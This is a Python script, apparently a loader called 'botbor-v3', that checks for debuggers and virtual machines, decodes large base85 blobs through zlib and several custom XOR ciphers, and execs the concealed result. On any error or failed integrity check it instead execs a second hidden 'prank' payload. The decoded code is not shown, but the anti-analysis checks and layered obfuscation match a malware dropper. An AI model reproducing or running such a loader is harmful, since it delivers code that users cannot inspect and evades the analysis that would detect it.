#!/usr/bin/env python3
import base64,zlib,hashlib,sys as _s,os as _o,time as _t,platform as _p

# Anti-debug
def _ad():
  if hasattr(_s,"gettrace") and _s.gettrace():_s.exit(1)
  if _p.system()=="Windows":
    try:
      import ctypes
      if ctypes.windll.kernel32.IsDebuggerPresent():_s.exit(1)
    except:pass
  try:
    if "PYDEVD" in str(_s.modules) or "pydevd" in str(_s.modules):_s.exit(1)
  except:pass
_ad()

# Anti-VM
def _av():
  vm_indicators=["vmware","virtualbox","qemu","xen","docker","hyperv"]
  try:
    bios="".join(open(p).read().lower() for p in ["/sys/class/dmi/id/sys_vendor","/sys/class/dmi/id/board_vendor"] if _o.path.exists(p))
    for v in vm_indicators:
      if v in bios:_s.exit(1)
  except:pass
_av()

# Decoder
def _D(x,d,k):
  kl=len(k)
  return bytes(x[i]^k[i%kl]for i in range(len(x)))

def _AES_D(data,key):
  box=list(range(256))
  ksum=sum(key)
  for i in range(256):
    j=(box[i]+key[i%len(key)]+ksum)%256
    box[i],box[j]=box[j],box[i]
  # Build reverse box
  rbox=[0]*256
  for i in range(256):rbox[box[i]]=i
  result=bytearray()
  prev=key[0]
  for b in data:
    orig=rbox[b]
    result.append(orig^prev)
    prev=b
  return bytes(result)

_K1=[167, 147, 75, 112, 130, 109, 87, 138, 56, 76, 33, 245, 211, 232, 25, 108, 180, 47, 122, 193, 94, 150, 13, 131]
_K2=[107, 57, 88, 50, 109, 80, 55, 118, 76, 52, 110, 81, 56, 119, 82, 49]
_K3=[131, 13, 150, 94, 193, 122, 47, 180, 108, 25, 232, 211, 245, 33, 76, 56, 138, 87, 109, 130, 112, 75, 147, 167]

_P="c-qZY-D=w~6u$RUoVXWBAaT>>t`N4cAGVf-()O}o6#Li~u_YtP>%!RmE>~DqD1<TCll2Mq2s?68*J&GAy3$oRa;&5CN#Bul^lde^3$3=tTx_HG0QuA;QuH0ybq^F169{C8pc8p2;50!2T4pE(f>9hb7zrVkUB=RQ`IOuop5;;*&{N$3Nk79g>;Qp<GIN{|Bk*$z-D>YTKt*bg`Wnny%^=lH;E`<-EJGL!pealfFx3cTMW&kV(kWM5m{$G23vfC6b~*d{RG)MA)^yKc^Fm&C16_Xqa`Ty;|9xv^yVs~y<gZ}Xw$CnBTdF0SKLB3>o3CrHP4?{G(OubL^R?_BW~_y4?W=D17yRWK%$MD&uexEi(<bl_wxi239K9OC{_D{Y4i1N-{RaI0@$2XRn$kPLVO&g@&4YysaFHIFPPw-k(9y!(dV(%OmO#k6C`z~xMNA{Gj0x}YsO_<G)Ig3|*H%}Fy{sf9>=;tUMdR^i^qv)vvkBw&ase**^LqllOqhWeGLt!r)083&$CzTQShgWhAxtrWkmZDz@&E;0OB0;J)JErM_||*W{dn<&FT1&W`<^bVEf@+Rr<?*7NQ!4j%AzzxQURw`wn`z!R=)$i4s>^xBH<b<a!(YUpHeZ9Feyp|>-UL&_B_w+0E%$n(mP5EoeYjuf$a*ziV;tzh<R&gC7^3Sdjz?3UC-#S)HYyHWn8cnFp4lRy0q5ROk<&Dt_fMnevNXC>kVOqK_a0`vdcX=>Gk`8+iaHuqefGWyW(6U+Vh^(rdw^Gy+Rw9@G!J%vD=0bX*tR{F(n`pc;3zZ_J$^_kl4{->_CjyCm>QpzB*oago#*q_>r4dukAP#5Z|})@O`WAT;I<qt@ysXAb+I|oj+<=!G-"

# Reconstruct data
_c0="c-jF}5v%S^hZdFPc?xaiDo$NsJeDmQL2)8ahx6i+eD(2X_|9Yw1;#Sv0Gk8I^*Ob#@6PzuLLidspvIe3h=ZqSr?t+HGl;S?FW$#WnEaDfX(S#+N+4IO%^4_@^wG=4ZdJ9EXS&d6OQ%i>pIjn&rQTY!Of!2rKa%x?a7F@kmc2p@G{k8Ai?qaL%URfj&BV{ljYX1h4kf$#E!Y4r+8iX!O7f6eUAId{12+|67x;8jjzv}k-T>1rvsNz=!l#k<TchZ~_R`(&@r0#{fsa7=f~JGD@~9oT)&y#QJD$N3fV3DjsXfAktVG0w0<PoLXPgIhhAG)@oKkcuk}SV7=_`jG1Qm8CDLKVHlWT<+#@w^~E!n6qzZu|y-K5O%8de(r%M=PlktBdS+JJ&1Z_IbQRkKSX%JD!Qb;>h<UKc2~WPAePl7Uhk4>fS@vv$P>h9KKA&vZRX*EIFXKD{lZlMhwPXU_Ni1ZV$YEZy{^Yc)pLS~JbqL)v-`<HSWF#FTm0`oLk=qp`uZ>e*B^0l=`UkJjh-AIVWomAKS{S2+|2VVYeeJDbz~0Yg91A3u6)%q(EMCyDeOn}Dn-b(?A0LQL*DD2_nT+K7P-Ke)t*wHlOi87yWY?@e1nYZB@ELSoOd<Asc57n-g9wK$}x3cQ<5<XzTnHCt9goPf(^a1Jv2#W>Wp3cMwqSGk^0dSCW2A%U?!WcYnQxALOKMtn2Jtxx`Zzg!Ce9Pe0evmHFS-tO2@3~)0T*AV3;?T*adQ_TzrJk&}QU35thJpdT7dAgVoU_jlwX4$iVmYx&;KnXY-h?&RzpM?w9w98)6cVLm8^u}oqOjapUAvCA5Xg9)!X7HBH22et)R3M?Rj`Ylop{>p2oH|ThaDDwY<~#U8*W@E0EljGg;gi_y?#7m?X<hRfyU>DPjC{$KgaOjK9$P$XQ!C(R{$~Qrto~;@mGFIb#!;F$<LOX?6z~$VI&06(<0P4EJ(nB4vCqw5ZnWJlHC*VtrGUH2l>pN$6>;!gT9Tif(;02xP&4ZS-*{Jxvjd&FePH6I$n*DFh~i8oOQl{*@&V@ZVew;w9{i>Q3mu5^3VE(Ze=MQ;hvb;5Bxa9o>;b9CH3gSZ=ZV&6(X)t#r=K0}cLYMk&p7`=7TUw}#w`yyO)noU7f@0|h2fO;@s8m_GX!07UaE8*EmO-EkI=-<y7uu2FhJQ3mqB<97v)_4fJt~ejMJQw{}}nl>Vyv4g8{W~iT-CAe^gn_^p9t(a85AI;ozKKTp}YjcMdTuxD0rxdDUD}&Xr`LPrQ9UxALOK>9A093g}zdUN0G7rnE))!+I|JXO34^(&Ds5LE4RO4Tf_{#B*TlL+S_1zU=bVLr&@&LN^|DTH;7jIan~(;^L>px!1#LV@5T|IaJ{fyqUSB8ZX{^B~8wA|HVTF`(G5^&*NdSbq9+D9h*K8HIH4~B5V|C!gs%t?L$QF7J+X)14jRU1(+2+BU>^y#{@Qn_Oo%Qw`Us?`TR^cKmHb(E?ZbMcL`hOahL~0m^F(D7@A4o?#7^PG$3%=fEkK5f_@qc*xWZpdA5Uu+x?tP7dN-ZqtW~hq)!GcB$ORUphLf?T>Doi;7<T6+NJnOJuE~mgZbQnolBj2BXvtitGIy?59qi@PM4O|kTltq+)DW!?Mj8?H3W_ROD`^aN$7G~$WnSLl)op<O1vgfUU^|0A{>f$_tpW0#NHi9*EEGJ`7A)P#UX8I+$}Q1XA-09Iv$H#jwd!6U_tu#S!C2=bU?#*_i)66Vc77LdTB%VYT>TK70U^17i`S<?r_q`gu1*>BWN>I0A|TJvVI|GATBJ;Sg_B2=&5-?_X}NE3hMz^8XX>GtkX_|Gl1$cJ;;c9AkQI4el=kd9DMo5xs#<(DhiTZzY$~#>00SwFwhD+0I3TGx^^zqSN^wXz1uqIYXQTHKDa`}LCaq<+|=tTq)^s!xPmHxZuN#M0|a0Hp}5~_WDa&p6}KmUpk@BQC`U`ZpdYb4JX}bKfbm*Gxg0&g9&bfRUnR~Tx(`tTAXKbMc5!B0xfcYH"
_c1="<+!v#_Cwlz#efb!d}w%!t?5vM!W2|3Hn6M)X->Y1fK{X6@?aGD#`gL~v!IP<gYE~tVMqQOyV(_4DqJ!W5$tdesD-c8IQ*6g5k}3ovXr0mVKzxCl;X5TcJE=a`gRq2NFOrwRvtLJp5yW<Kr$nsanKA4y32pKKwQHBj!f0Mejgr}CB-}ESk#8iVN7Kn4V}wuX37N6)8#y|Y%@5})pb|U4g)8=G?rO*uSC*RQf1_lg8TRsm$atsbixfSg7Vz-_|2ffjCU=bGi{AoMONW2{?<)WfE{6@8vAsujtv@pQ>O6-@yzEL2@1!JQKAMRI+yq9tkuWw9)uT_DffY$drxwf39gJ2QXt(Gr^26l%sudokwlfNi{a<|!4UG(G*?S+EZV@x?sjd4n1UBu(bx1gxF8hwRUq$lV=JSTKE-S@D;jt)2jalHi$!&@t&sZ@AyPq`=^cl{-;~jz)$RzEZo8ODQFkoLPr3R^rP@{v&<+`{C-$G6k$_|uP8jKGRAuzkLShw<y{&o2BK$)TFNAC$a8ciigv@jVb`n03XCX;Xm_>VrO#vM3!cGAFZ@uf-LcBm9*9fA?Cd8vT;EsM5+H??rjQ6l`+{WPveIGCE={hD*ocwIDmus~y0G(+?t4qFDJ`aKxjy#ZstQW57vOlV)aRrC4!3Y>79L)^AhcnMr#wKvaz_2UuuH>0x4+o=VJlYl9Y1F^$8m@X8FP8;Qz<;kute;au@nOW6TsT!jGxbm4;e`_cQY1;E?n@HR*?7seMkgT-BK^f5C_=;wmk-?WHu!QHmno~s-T#$aHT6inm-bg!r?{?_-`zLFXR40xaqySik0hewumz4q%i+ch3}Wo_|AR9r_Q}8|_9)&SQNoaWve*0*A$<_(l{SoL*&E1*O%gDyeSh^cKZ9gbMLB@`j6M`!jzv{kqRt*;*i4h<ZWQkbCwSsB3;`P6Cc?Q-oQFSCD9coo=+j@n$&rZKtxtb|S;~K8cx;KPYqECEW|>zy7h4$TzhTqWkTqNOkw7@Hu>T}Hw%3l)R<>VGu^g?Jz^I8PJ-B-H|5egZpL%!s&hdKGYW0wbS@rwl7X@ZPJb!w2Jtn7yYR*KgN=iRd3)1XaQbL?)d=&IEc<>E?J{JoA-EUBjUuhf675RkmYgbSjtLw3%SaWICtII(I&M|P0nkPnHK;f>`cS+mNmeaY}%hF<9v9%-6;+5)JC?tRI{0OQD0C6cu5hsjUomjz{3DeX^_gVrPBrp<_!Fqy88ub={*V!;}r6lhS3!hUBe~*CU&^Rgn!tAWyTrZ}dAIkF+gINp2C}wbz^~XaK$|?3iJ4Xz?2kFHt1?5cy%bdVa*f>v<&qwt7O%v|qGVQfwaBSI7rZ1KBb!oR`_#Ah7Vv~oHbzrM0#Sh~`V6&p7VzhGzQ8mQ0>89o4GUz?4f}|=BxTUZuAoy~M{q2bo893q25Q{5vaK+EBseqKb9uUPg)J?;~k{g@G++D+MZ*cbU{j4sYS*EYuITpQ=Ly<B-^ucX;2PH|$Zjj)56$dQ#BB9-u&0)!zYI#I+uGva2uTa_a!6s6<YTzR-D-#t9(@EAJq`sNS0wk64TR$mCKQ2gJ5oF<Ll=9pO5aCz?L=ZC^6_m)~cZa?o<Fk4FV}6OMcvR%o_zt8kKN1Ll*=c96x2p9OvJ7?BrI05jJm4L+a->F&(^$~6MCP}5IZ=gxn0jOFq$4<ebmfHPM`GB+ILC+GqmGES<~$iePKVG+@^)?1<$1(z!LouUxUsb;5oPWJ47}~<jlz`tkZD9HHBrsJ?d-@bCVAb2b{7GGOx{{0Q+&plFfIPddZXA0q{E7CVp3E17+l3ZG|*3kGD&o%C%AfNf9E6Ma-j!1X#b(z$wc}O*tpbsJu*Dj(^Aq*O%{Fa;L${s;^DvZeemBaL{`^5t4;~bn;w<-jeZ|89<VyN;Z%1cgL8GAffe6s`Rso7(6#9aFuAp}wVK>cdF{n67JquQehV`2r^kp-vzuiroRB-|9?M4*SkDDNJLYbYPrUJ;ex5BLjovo^;h<P+Se6sMh9Qb`"
_c2="?<luNKiG1ORb(wq5ren@P;vj#jC$V8S#0(F)nh0)6s10lV1X%(dK3L#hySaO(P}hY#%kW$BF8FmD{(cGM>DF?welBBKWGZK?_Q!%V-52ems^dv{?P{8rB7Hj+x`YP7mMAN&0(Ge+W_)i6J;D&5M*tEps_7Db6N^J9rJTUM6)66cvKUiQssvgBqEe*h@m_0fH{(u4$v5V+luKBtQ+Io;)G`G^V-&G!f-*9<f2RTJbV#d&S#I>rD4doPS@lSDA4}lSbsj6{7=EHU2o;O5K3Pw33Nqvc7jsyXbYJ9o64!e5XdVdY;S=VMKY3>#Ua}vJ*&_JQL<-93939r0GQ9!B5_ra;i+06>20j2L+Xr`+|<>=K};EdHx}uK;Z&_?Qq(W3_5a#MhvKjb880rQ0W08PhFol6JLOX1)H~&BA>QbsSK}Zd)9MOm45P{K1bRLRqWmc5aCe{$LA5dc);rz6AT=1d;n@=793~T}U4W7W3c?>VMlk9}A>^h6E%>x|^T=at68I)B<d%KY7*Ee#n;BdNGR`|JlFUF<?FL3~!*Kkuq$kI}m`s1Ska7raJ97)fC}wc&oqsCo)pd4d!@c$Lx;m@WWl-|Ax=?b!I*c8P<IWM4Llf`H2AcC+?WQBn!?fRE9T<Puu)Raf6>%Imcx*X?dEEFtxALNMKr!NUOESaMRbU}kX}Gm7naBH!>00WL{R@LSAoqc^LZy!#4*$TQeTX3?qdv}}W_>b;_7N%+D;zw>jV(G}6Mdz4yM89hxA#o3$FH9M%6J^i7RJbdE&02)ds|{Y5g{KX1^-3ITxnHND!SQ-N&`uvXBGe#tM2wdwvU>4v6nAEFZvPU_%@BO$hxjGwZNEV5Wx%q$yN)AkC)`h6nB4VL^^hd5+^v)ti~|$h5m&F7^l%Q`=tCXY!x$A*Uc6K@ea78EoNpiXnX?R;*>)Me;)y5+x}A>*X*pB(jnVUg}+YGIZde}EK(tT#nfKt%sB|Mt%XsX8MhnAc~LgIcfe(6AW;Y<io+}ARvj5I41V&CGILzA>`%4QPe1UC#U4FngYndbAIcg2**Gjb+057x54q=L!6;lO7f}C8Pt>D7`5K3F!vB*&^2@xRP^G^{V<_>IuHFvy*???mHo(vFrwbvR*$xVnc6{-IKDef&G6U_VYjMsvh0L(KPi%^kFU*~1tNxga(E`c-Mh6k53v>PlmO3g}_h;joN7b&?mAt7#jS4)A6e~1~{DWFjsyfa|Gs#_Hhj5>)wwN#bw4*rjC#~*8-4YsSE|}?9YbN^^IMIb=d@Zp(DWH|FH7kta90z}FxthGfB;}sDuwjG^cvzb{i%vhNBXfCRyfr$P+gxjpXu>hQTNKIzNROaapX!iTVjm>EsOV~5))L9k4t|=rV$LBcL9h+v2A*cY45cYEdMb+@XaO2uo$=o*L{{e#l%8<ix$=7LHt$>y!1EJxzb3t@eEScgqw{omyMO*#==n?&CsS|^$OU&@c<TlQ5J)0vuhhV+YPd}4?n2`Fi*wkWvqOg^zYybIDlA!fiYkrY&qt-J<z?aXd+U>lErQ{=2uo+};2lV9F(lJ%?VK)ecuu~MpHgF+caL2"
_E=_c0+_c1+_c2

# Main
try:
  _z=base64.b85decode(_E)
  _x=zlib.decompress(_z)
  _x=_D(_x,_K3)
  _x=_AES_D(_x,_K2)
  _x=_D(_x,_K1)
  _p=_x.decode()
  if _p[:4]=="#IB:":
    _ib=_p[4:20]
    _c=_p[21:]
    _ch=hashlib.sha256(("botbor-v3-secure-2024"+_c+"botbor-v3-secure-2024").encode()).hexdigest()[:16]
    _ch2=hashlib.md5((_c+"botbor-v3-secure-2024").encode()).hexdigest()[:8]
    if _ib!=_ch+_ch2:
      # TAMPERED - show prank
      _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"));_s.exit(0)
  exec(compile(_p,"<botbor>","exec"))
except Exception as _e:
  # Any error = prank
  try:
    _pz=base64.b85decode(_P);_pc=zlib.decompress(_pz).decode();exec(compile(_pc,"<botbor>","exec"))
  except:print("\n  [FATAL] Source integrity FAILED. Contact @machine_id_bot");_s.exit(1)